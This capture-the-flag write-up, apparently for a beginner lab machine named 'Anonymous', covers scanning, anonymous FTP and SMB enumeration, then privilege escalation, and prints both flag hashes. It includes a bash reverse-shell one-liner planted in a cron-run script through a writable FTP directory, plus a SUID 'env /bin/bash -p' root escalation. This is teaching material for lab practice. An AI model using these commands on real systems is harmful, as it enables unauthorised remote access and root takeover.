# Anonymous

## Description

Not the hacking group

Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

## Initial Scan

Let's start with an Nmap scan:

~~~
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-11-27T09:14:48
|_  start_date: N/A
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-11-27T09:14:47+00:00
~~~

## Questions

### Q1 - Enumerate the machine.  How many ports are open?

The scan reveals four open port:
* 21 ftp (anonymous login allowed)
* 22 ssh
* 139 smb
* 445 smb

Answer: `4`

### Q2 - What service is running on port 21?

Answer: `ftp`

### Q3 - What service is running on ports 139 and 445?

Answer: `smb`

### Q4 - There's a share on the user's computer.  What's it called?

Let's connect to the smb server using `smbclient`. By listing the shares, we can see the answer:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Anonymous]
└─$ smbclient -L //$IP/
Enter WORKGROUP\user's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics   <----------
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
~~~

Answer: `pics`

### Q5 - user.txt

There were two pictures in the share, but there is nothing to extract from them, so let's move on to the FTP service since anonymous login is allowed.

After I logged into the ftp service as anonymous, I found a directory containing three files. I downlaoded them to check them out:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Anonymous/files]
└─$ ftp $IP
Connected to 10.10.152.65.
220 NamelessOne's FTP Server!
Name (10.10.152.65:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2666 Nov 27 09:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> mget *
mget clean.sh? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (2.8250 MB/s)
mget removed_files.log? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (2666 bytes).
226 Transfer complete.
2666 bytes received in 0.00 secs (3.4639 MB/s)
mget to_do.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (1.0294 MB/s)
ftp> exit
221 Goodbye.
~~~

First, let's read `to_do.txt`:

~~~
I really need to disable the anonymous login...it's really not safe
~~~

No sh!t. Let's take a look at the bash file now:

~~~bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
~~~

Well it's a simple bash script which checks if a folder is empty or not. If it is, it saves a message in `removed_files.log` which we have downloaded. If it's not empty, It deletes them and saves the date and a message in the log file.


#### Reverse shell

I downloaded and checked the log file again, and a few messages have been added to it, which means the bash file is being run by a cronjob. Since the scripts directory is writable, we can replace the bash file in the ftp service, with a file containing a reverse shell with the same name and when the file is being run again, our reverse shell will be executed:

~~~
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .         <----------
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh  <----------
-rw-rw-r--    1 1000     1000         4773 Nov 27 10:00 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
~~~

Let's see how it's done. First edit the script you downlaoded or create a new one with the same name. Then replcae the content with a bash reverse shell. Here's the reverse shell:

~~~
#!/bin/bash
bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1
~~~

Now first open a listener (`rlwrap nc -lvnp 4444`) and then log into the ftp service and head to `scripts` directory. Now use `put` command to uplaod the reverse shell:

~~~
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
54 bytes sent in 0.00 secs (532.6705 kB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000           54 Nov 27 10:11 clean.sh
-rw-rw-r--    1 1000     1000         5246 Nov 27 10:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
~~~

Now you can see the size has changed which means our reverse shell has been uplaoded. After waiting for a little while, we get a shell as `namelessone` and the first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Anonymous/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.**.**] from (UNKNOWN) [10.10.152.65] 42314
bash: cannot set terminal process group (1920): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ python -c "import pty;pty.spawn('/bin/bash')"
~~~

#### User flag

Now if you list the files in our home directory, you can see the user flag:

~~~
namelessone@anonymous:~$ ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
~~~

User flag: `90d6f992585815ff991e68748c414740`

### Q6 - root.txt

The first thing I did was checking the cronjobs, and we can confirm that `clean.sh` is running every minute:

~~~
namelessone@anonymous:~$ crontab -l | tail
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
* * * * * /var/ftp/scripts/clean.sh
~~~

#### Privilege Escalation

I ran `sudo -l` to check my sudo permissions, but I don't have the user's password, so I decided to check programs that are owned by root with the SUID bit set using `find` command:

~~~
namelessone@anonymous:~$ find / -type f -perm -u=s 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su

[REDACTED]

/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env      <--------------
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
~~~

I checked [GTFOBins](https://gtfobins.github.io/) and found a command which has potential to gain us `root` access using `env`:

~~~
namelessone@anonymous:~$ env /bin/bash -p
bash-4.4# whoami
root
~~~

#### Root flag

Now that we are root, we can head to `/root` and read the root flag:

~~~
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
4d930091c31a622a7ed10f27999af363
~~~

Root flag: `4d930091c31a622a7ed10f27999af363`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d 0ne! : )